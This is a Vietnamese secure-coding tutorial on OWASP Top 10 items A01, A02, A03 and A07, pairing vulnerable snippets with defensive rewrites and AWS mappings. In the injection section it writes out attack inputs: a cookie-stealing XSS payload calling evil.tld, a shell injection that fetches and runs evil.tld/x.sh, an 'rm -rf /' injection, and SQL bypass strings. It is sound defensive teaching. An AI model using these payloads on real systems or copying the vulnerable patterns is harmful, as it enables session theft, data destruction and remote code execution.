# OWASP Top 10 — phần 1

OWASP Top 10 (bản 2021) là danh sách 10 nhóm rủi ro web phổ biến và nguy hiểm nhất, được tổng hợp từ dữ liệu thực tế của hàng trăm nghìn ứng dụng. Là **kỹ sư xây hệ thống** (không phải pentester), bạn không cần biết viết exploit điêu luyện — bạn cần biết **lỗ hổng trông như thế nào trong code của mình** và **viết lại cho an toàn**. Bài này đi qua 4 nhóm hàng đầu: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A07 Identification & Authentication Failures.

Mỗi mục theo cùng một khuôn: **kẻ tấn công làm gì → code dễ vỡ → code phòng thủ → checklist**. Hãy đọc với tư duy "nếu tôi là người chịu trách nhiệm, tôi review PR này có cho merge không".

> 💡 Nguyên tắc: Bảo mật không phải là một feature bạn "thêm vào cuối" — nó là cách bạn viết từng dòng truy vấn, từng route, từng hàm so sánh mật khẩu. Defense in depth: giả định mọi tầng phía ngoài đã thất bại.

---

## A01 — Broken Access Control

Đây là nhóm **đứng số 1** trong OWASP 2021 (leo từ vị trí 5 năm 2017). Lỗi không nằm ở "đăng nhập được hay không" (đó là authentication) mà ở **"đăng nhập rồi thì được làm gì"** (authorization). Phần lớn bug access control xảy ra vì code **tin vào dữ liệu client gửi lên** để quyết định quyền.

### IDOR — Insecure Direct Object Reference

**Kẻ tấn công làm gì:** Người dùng hợp lệ `alice` gọi `GET /api/invoices/1001` và thấy hóa đơn của mình. Cô ta thử đổi sang `GET /api/invoices/1002` — và xem được hóa đơn của người khác, vì server chỉ kiểm tra "đã đăng nhập" chứ không kiểm tra "hóa đơn này có phải của bạn không".

```js
// ⚠️ Code dễ vỡ — chỉ check đăng nhập, không check ownership
app.get("/api/invoices/:id", requireAuth, async (req, res) => {
  const invoice = await db.invoice.findById(req.params.id);
  res.json(invoice); // ai đăng nhập cũng xem được MỌI invoice
});
```

```js
// ✅ Code phòng thủ — ràng buộc theo chủ sở hữu trong chính câu truy vấn
app.get("/api/invoices/:id", requireAuth, async (req, res) => {
  const invoice = await db.invoice.findOne({
    id: req.params.id,
    ownerId: req.user.id, // server quyết định, KHÔNG lấy từ client
  });
  if (!invoice) return res.sendStatus(404); // 404 chứ không 403 để không lộ sự tồn tại
  res.json(invoice);
});
```

Điểm mấu chốt: **luôn lọc theo chủ thể (subject) lấy từ session/token phía server**, không bao giờ tin `ownerId` do client gửi. Dùng ID khó đoán (UUID) chỉ là "security through obscurity" — không thay thế được kiểm tra quyền.

> ⚠️ Lỗ hổng: Mass assignment là họ hàng của IDOR. Nếu bạn làm `db.user.update(req.body)`, kẻ tấn công thêm `"role":"admin"` vào body để tự nâng quyền. Luôn whitelist field được phép cập nhật.

### Missing Function-Level Access Control

**Kẻ tấn công làm gì:** Trang `/admin/users` được ẩn khỏi menu của user thường, nhưng endpoint API `POST /api/admin/users/:id/ban` không hề kiểm tra vai trò. Một user thường đoán ra URL (hoặc đọc JS bundle) và gọi thẳng API để ban người khác.

```python
# ⚠️ Code dễ vỡ — ẩn nút trên UI nhưng API không kiểm tra role
@app.post("/api/admin/users/<uid>/ban")
@require_auth
def ban_user(uid):
    users.ban(uid)   # bất kỳ ai đăng nhập đều gọi được
    return {"ok": True}
```

```python
# ✅ Code phòng thủ — kiểm tra quyền ở tầng server, deny-by-default
def require_role(role):
    def deco(fn):
        @wraps(fn)
        def wrapper(*a, **kw):
            if role not in g.user.roles:
                abort(403)
            return fn(*a, **kw)
        return wrapper
    return deco

@app.post("/api/admin/users/<uid>/ban")
@require_auth
@require_role("admin")        # bắt buộc, không dựa vào UI
def ban_user(uid):
    users.ban(uid)
    return {"ok": True}
```

> 💡 Nguyên tắc: **Deny by default**. Access control phải nằm ở **server-side**, áp dụng tập trung (middleware/decorator/policy) chứ không rải rác. UI chỉ là gợi ý trải nghiệm — đừng bao giờ coi việc "ẩn nút" là cơ chế bảo mật.

**Checklist A01:**
- Mọi truy vấn đọc/ghi resource đều lọc theo chủ thể từ session, không từ input.
- Authorization tập trung (policy engine / middleware), bật cho mọi route theo mặc định.
- CORS cấu hình chặt (không `Access-Control-Allow-Origin: *` cho API có credentials).
- Test: đăng nhập bằng user A, thử truy cập resource của user B → phải 403/404.

---

## A02 — Cryptographic Failures

Nhóm này (trước 2021 gọi là "Sensitive Data Exposure") nói về việc **bảo vệ dữ liệu nhạy cảm** — sai sót ở đây làm lộ password, thẻ tín dụng, PII, token. Lỗi thường gặp không phải "thuật toán bị bẻ gãy" mà là **dùng sai cách**: hash yếu, không mã hóa khi truyền, hardcode key.

### Lưu mật khẩu sai cách

**Kẻ tấn công làm gì:** Database bị lộ (qua SQLi, backup rò rỉ...). Nếu mật khẩu lưu plaintext hoặc hash bằng MD5/SHA-1 không salt, kẻ tấn công dùng rainbow table / GPU brute-force để khôi phục hàng triệu mật khẩu trong vài giờ, rồi credential stuffing sang dịch vụ khác.

```js
// ⚠️ Code dễ vỡ
const hash = crypto.createHash("sha256").update(password).digest("hex");
// SHA-256 nhanh → GPU thử hàng tỉ lần/giây. Không salt → rainbow table.
```

```js
// ✅ Code phòng thủ — dùng hàm hash chậm, có salt, chuyên cho mật khẩu
import argon2 from "argon2";

// Đăng ký: argon2id tự sinh salt ngẫu nhiên, nhúng tham số vào chuỗi kết quả
const hash = await argon2.hash(password, { type: argon2.argon2id });

// Đăng nhập: so sánh an toàn, chống timing attack
const ok = await argon2.verify(hash, password);
```

Lựa chọn 2025: **Argon2id** (ưu tiên), hoặc **scrypt**, **bcrypt** (cost ≥ 12). Tuyệt đối không MD5/SHA-1/SHA-256 trần cho mật khẩu.

### Phân biệt mã hóa, hashing, encoding

| Mục đích | Kỹ thuật | Đảo ngược được? | Dùng cho |
|---|---|---|---|
| Bảo mật mật khẩu | Hashing chậm (Argon2id, bcrypt) | Không | Lưu password |
| Bảo vệ dữ liệu cần đọc lại | Encryption (AES-256-GCM) | Có (với key) | Thẻ, PII at rest |
| Toàn vẹn / chữ ký | HMAC, chữ ký số | Không | Token, webhook |
| Biểu diễn dữ liệu | Encoding (Base64) | Có (ai cũng đảo) | **KHÔNG phải bảo mật** |

> ⚠️ Lỗ hổng: Base64 **không phải** mã hóa — `atob()` đảo ngược tức thì. Đừng bao giờ "bảo mật" thông tin bằng cách Base64 nó. Tương tự, JWT mặc định chỉ **ký** (integrity) chứ không **mã hóa** payload — đừng nhét secret vào JWT claim rồi tưởng nó kín.

### Dữ liệu khi truyền và khi nghỉ

```nginx
# ✅ Bắt buộc HTTPS + HSTS để chống downgrade/sslstrip
server {
  listen 443 ssl;
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
}
# Redirect mọi HTTP -> HTTPS
server { listen 80; return 301 https://$host$request_uri; }
```

**Checklist A02:**
- Password: Argon2id/bcrypt; không bao giờ log password hay token.
- TLS 1.2+ ở mọi nơi, HSTS bật; tắt cipher cũ yếu.
- Dữ liệu nhạy cảm at rest mã hóa (AES-256-GCM); key quản lý bằng KMS, **không hardcode**.
- Cookie chứa session: `Secure`, `HttpOnly`, `SameSite`.
- Không thu thập/lưu dữ liệu nhạy cảm nếu không thực sự cần (data minimization).

---

## A03 — Injection

Injection xảy ra khi **dữ liệu do người dùng kiểm soát bị diễn giải thành lệnh/code** thay vì dữ liệu thuần. Gốc rễ luôn giống nhau: **trộn lẫn data và code bằng cách nối chuỗi**. Cách phòng cũng có một chủ đề chung: **tách data ra khỏi code** (parameterize / encode).

### SQL Injection

**Kẻ tấn công làm gì:** Form đăng nhập nối thẳng input vào câu SQL. Kẻ tấn công nhập username `admin' --` hoặc `' OR '1'='1` để bỏ qua điều kiện, đăng nhập không cần mật khẩu, thậm chí dump cả bảng users.

```python
# ⚠️ Code dễ vỡ — nối chuỗi
q = f"SELECT * FROM users WHERE name = '{name}' AND pass = '{pw}'"
# input name = "admin' --"  → câu SQL biến thành:
# SELECT * FROM users WHERE name = 'admin' -- ' AND pass = '...'
db.execute(q)
```

```python
# ✅ Code phòng thủ — parameterized query (prepared statement)
db.execute(
    "SELECT * FROM users WHERE name = %s AND pass = %s",
    (name, pw),  # driver gửi data tách biệt khỏi câu lệnh -> không thể "thoát" ra code
)
```

Quy tắc: **luôn parameterize**. Nếu phải truyền tên bảng/cột động (không parameterize được), hãy **whitelist** giá trị cho phép, không nối thẳng. ORM giúp nhiều nhưng `raw()` / string interpolation trong ORM vẫn vỡ như thường.

> 💡 Nguyên tắc: Đừng "lọc ký tự xấu" (blacklist `'`, `;`...) để chống SQLi — luôn có cách bypass (encoding, ký tự Unicode tương đương). Parameterize là cách đúng và duy nhất đáng tin.

### Cross-Site Scripting (XSS)

XSS là injection vào **trình duyệt**: kẻ tấn công nhét JavaScript chạy trong phiên của nạn nhân để đánh cắp cookie/token, thực hiện hành động thay nạn nhân, hoặc keylog.

| Loại | Payload đi qua đâu | Ví dụ |
|---|---|---|
| **Reflected** | Quay lại ngay trong response (URL param) | Link độc `?q=<script>...</script>` gửi qua email |
| **Stored** | Được lưu vào DB rồi render cho người khác | Comment chứa `<script>` hiển thị cho mọi viewer |
| **DOM-based** | JS phía client tự ghi input vào DOM | `el.innerHTML = location.hash` |

**Kẻ tấn công làm gì (stored):** Đăng một comment `<script>fetch('https://evil.tld/c?'+document.cookie)</script>`. Mỗi người xem trang comment đều bị gửi cookie sang server kẻ tấn công.

```js
// ⚠️ Code dễ vỡ — nhét input thẳng vào HTML
element.innerHTML = "Xin chào " + userInput;          // reflected/stored XSS
node.innerHTML = location.hash.slice(1);              // DOM XSS
```

```jsx
// ✅ Phòng thủ 1 — output encoding theo ngữ cảnh
element.textContent = "Xin chào " + userInput;        // textContent KHÔNG parse HTML
// React/Vue/Angular tự escape khi render {userInput}; chỉ vỡ nếu bạn cố tình:
<div dangerouslySetInnerHTML={{ __html: userInput }} /> // ⚠️ tránh, hoặc sanitize trước
```

```js
// ✅ Phòng thủ 2 — nếu BUỘC phải render HTML do người dùng nhập, sanitize allowlist
import DOMPurify from "dompurify";
node.innerHTML = DOMPurify.sanitize(userHtml);
```

```http
# ✅ Phòng thủ 3 (defense in depth) — Content Security Policy chặn inline script
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
```

Cộng thêm: cookie session đặt `HttpOnly` để JS không đọc được — kể cả khi XSS xảy ra, token khó bị hút ra.

### Command Injection

**Kẻ tấn công làm gì:** Một endpoint "ping host" nối input vào lệnh shell. Kẻ tấn công nhập `8.8.8.8; rm -rf / --no-preserve-root` hoặc `$(curl evil.tld/x.sh|sh)` để chạy lệnh tùy ý trên server (RCE).

```js
// ⚠️ Code dễ vỡ — gọi shell với chuỗi nối
const { exec } = require("child_process");
exec(`ping -c1 ${host}`);   // host = "8.8.8.8; rm -rf /" -> thực thi cả hai lệnh
```

```js
// ✅ Code phòng thủ — KHÔNG qua shell, truyền argv tách biệt + validate
const { execFile } = require("child_process");

if (!/^[a-zA-Z0-9.\-]+$/.test(host)) throw new Error("invalid host"); // allowlist
execFile("ping", ["-c1", host]);  // không có shell -> ';', '|', '$()' chỉ là chuỗi thường
```

> 💡 Nguyên tắc cho cả A03: **Tách data khỏi code.** SQLi → parameterized query. XSS → output encoding + CSP. Command injection → truyền argv array, không gọi shell. Cùng một tư duy: dữ liệu người dùng không bao giờ được "biến thành" lệnh.

**Checklist A03:**
- 100% truy vấn DB dùng parameterized query; không string interpolation.
- Output encoding đúng ngữ cảnh (HTML/attr/JS/URL); dùng framework auto-escape, tránh `innerHTML`/`dangerouslySetInnerHTML`.
- CSP nghiêm, cookie `HttpOnly` + `SameSite`.
- Không gọi shell với input người dùng; nếu cần, `execFile`/argv + allowlist.
- Validate input ở biên (kiểu, độ dài, định dạng) — nhưng coi đây là phụ trợ, không thay parameterize/encode.

---

## A07 — Identification & Authentication Failures

Nhóm này (trước 2021 là "Broken Authentication") gom các lỗi liên quan **xác thực danh tính**: brute-force không bị chặn, session quản lý lỏng lẻo, cho phép mật khẩu yếu, không có MFA.

### Credential Stuffing & Brute-force

**Kẻ tấn công làm gì:** Lấy danh sách email/password rò rỉ từ vụ khác, tự động thử hàng triệu lần lên endpoint login của bạn. Nếu không rate-limit, không khóa, không MFA → một tỷ lệ tài khoản sẽ bị chiếm.

```python
# ✅ Phòng thủ — rate-limit theo IP + theo tài khoản, generic error, thời gian phản hồi đồng đều
@app.post("/login")
@limiter.limit("5/minute")          # chặn brute-force theo IP
def login():
    user = users.find(email)
    # luôn chạy verify dù user tồn tại hay không -> chống user enumeration qua timing
    ok = ph.verify(user.hash if user else DUMMY_HASH, password)
    if not (user and ok):
        return error("Email hoặc mật khẩu không đúng", 401)  # message chung chung
    if user.mfa_enabled:
        return challenge_mfa(user)
    return start_session(user)
```

Bổ sung: chặn theo cả tài khoản (không để 1 account bị thử từ 10.000 IP), kiểm tra mật khẩu trùng danh sách đã rò rỉ (have-i-been-pwned k-anonymity), thêm CAPTCHA khi nghi ngờ.

### MFA và passkeys (chuẩn 2025-2026)

Mật khẩu đơn lẻ không còn đủ. Thứ tự ưu tiên độ mạnh:

| Yếu tố thứ hai | Chống phishing? | Ghi chú |
|---|---|---|
| SMS OTP | Không | Dễ bị SIM-swap, OTP bị phish realtime — chỉ tốt hơn không có |
| TOTP (app authenticator) | Một phần | Vẫn bị phish realtime nếu user nhập vào trang giả |
| **Passkey / WebAuthn (FIDO2)** | **Có** | Khóa gắn với origin, không gửi secret qua mạng — chống phishing tận gốc |

**Passkey** dùng cặp khóa public/private; private key nằm trong thiết bị/secure enclave, ký challenge gắn với domain → trang phishing có domain khác sẽ không lấy được chữ ký hợp lệ. Đây là hướng khuyến nghị thay thế cả password.

```js
// ✅ Đăng ký passkey (WebAuthn) — phía server cấp challenge, RP ID = domain thật
const options = await generateRegistrationOptions({
  rpID: "app.example.com",          // ràng buộc origin -> chống phishing
  userID, userName,
  authenticatorSelection: { residentKey: "required", userVerification: "required" },
});
// Trình duyệt: navigator.credentials.create({ publicKey: options })
// Server lưu credential public key; lần sau verify chữ ký challenge.
```

### Quản lý Session

```js
// ✅ Phòng thủ phiên đăng nhập
res.cookie("sid", sessionId, {
  httpOnly: true,    // JS không đọc được -> giảm tác hại XSS
  secure: true,      // chỉ gửi qua HTTPS
  sameSite: "lax",   // giảm CSRF
  maxAge: 1000 * 60 * 30,
});
// Bắt buộc: ĐỔI session ID sau khi đăng nhập (chống session fixation)
req.session.regenerate(() => { /* gán user */ });
// Logout/đổi mật khẩu -> hủy session phía server, không chỉ xóa cookie.
```

> ⚠️ Lỗ hổng: Không **rotate session ID** sau đăng nhập → session fixation: kẻ tấn công đặt sẵn session ID cho nạn nhân, đợi họ đăng nhập rồi dùng chính ID đó. Luôn `regenerate` khi nâng quyền (login).

**Checklist A07:**
- Rate-limit + lockout theo IP và theo account; CAPTCHA khi bất thường.
- Hỗ trợ MFA, ưu tiên passkey/WebAuthn; coi SMS là phương án cuối.
- Cấm mật khẩu yếu/đã rò rỉ; không bắt đổi mật khẩu định kỳ vô nghĩa (theo NIST).
- Session ID dài ngẫu nhiên, cookie `HttpOnly/Secure/SameSite`, hết hạn hợp lý, regenerate sau login, hủy thật khi logout.
- Thông báo lỗi đăng nhập chung chung, thời gian phản hồi đồng đều (chống enumeration).

---

## Liên hệ sang AWS

Các nguyên tắc trên ánh xạ trực tiếp sang dịch vụ AWS khi bạn xây hệ thống trên cloud:

- **A01 Broken Access Control → IAM & policy:** Áp dụng least privilege bằng IAM policy/role, deny-by-default. Với access control trong app, dùng **Amazon Verified Permissions** (Cedar) làm policy engine tập trung thay vì rải `if` khắp code. **S3 Block Public Access** + bucket policy để tránh IDOR cấp hạ tầng (object công khai ngoài ý muốn).
- **A02 Cryptographic Failures → KMS, ACM, Secrets Manager:** Quản lý khóa bằng **AWS KMS** (không hardcode), mã hóa at rest mặc định (S3/EBS/RDS SSE-KMS). **ACM** cấp/tự gia hạn chứng chỉ TLS; bật HTTPS-only và HSTS ở CloudFront/ALB. Lưu secret trong **Secrets Manager** với auto-rotation, không nhét vào biến môi trường hay code.
- **A03 Injection → WAF (defense in depth):** **AWS WAF** với managed rule group (SQLi, XSS, Core Rule Set) đặt trước CloudFront/ALB/API Gateway là lớp chặn bổ sung — **không thay** parameterized query/output encoding trong code, mà là lớp lưới an toàn thứ hai.
- **A07 Auth Failures → Cognito:** **Amazon Cognito** lo authentication, MFA (TOTP/SMS), passkey/WebAuthn, account lockout, password policy, hosted UI OAuth/OIDC — đỡ phải tự viết login dễ sai. Bảo vệ login bằng **WAF rate-based rule** chống brute-force/credential stuffing.
- **Phát hiện & ứng phó:** **GuardDuty** phát hiện hành vi bất thường (login lạ, credential bị lạm dụng, gọi API khả nghi); **CloudTrail** ghi lại mọi API call để điều tra; **Security Hub** tổng hợp phát hiện theo chuẩn (CIS, AWS FSBP) — đây là phần "monitoring & response" của defense in depth.

> 💡 Nguyên tắc tổng kết: AWS cho bạn nhiều "lớp lưới" (WAF, GuardDuty, KMS, Cognito), nhưng **không lớp nào thay được code an toàn**. Hãy viết đúng từ trong app trước, rồi xếp các dịch vụ AWS làm defense in depth phía ngoài.
